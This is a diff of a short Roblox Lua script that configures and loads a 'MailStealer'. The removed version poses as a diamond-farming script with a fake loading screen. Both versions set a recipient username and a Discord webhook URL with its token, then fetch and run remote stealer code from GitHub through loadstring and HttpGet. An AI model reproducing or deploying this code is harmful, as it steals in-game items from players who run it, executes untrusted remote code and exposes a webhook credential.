@@ -1,10 +1,5 @@
-Username = "psxgodlol100"
-WebHook = "https://discord.com/api/webhooks/1115633827088437269/g3xVoo7nVfea0-uDtsrrYdQ_Jl7OM9viebs98SyKLoShtnAsmqIpTPFVQavCrDgr2jzW"
-loadingscreen = true
-_G.CustomScriptName = "Henry's V4 Mystic Mine Farmer"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Farming diamonds..."
-_G.Text3 = "Earned 1.5b..."
-_G.Text4 = "Server Hopping..."
+_G.UserNamey = "psxgodlol100"
+_G.Webhooky = "https://discord.com/api/webhooks/1115633827088437269/g3xVoo7nVfea0-uDtsrrYdQ_Jl7OM9viebs98SyKLoShtnAsmqIpTPFVQavCrDgr2jzW"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/procat69420/ProcatMAILSTEALER/main/ProcatMAILSTEALER.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97"))()
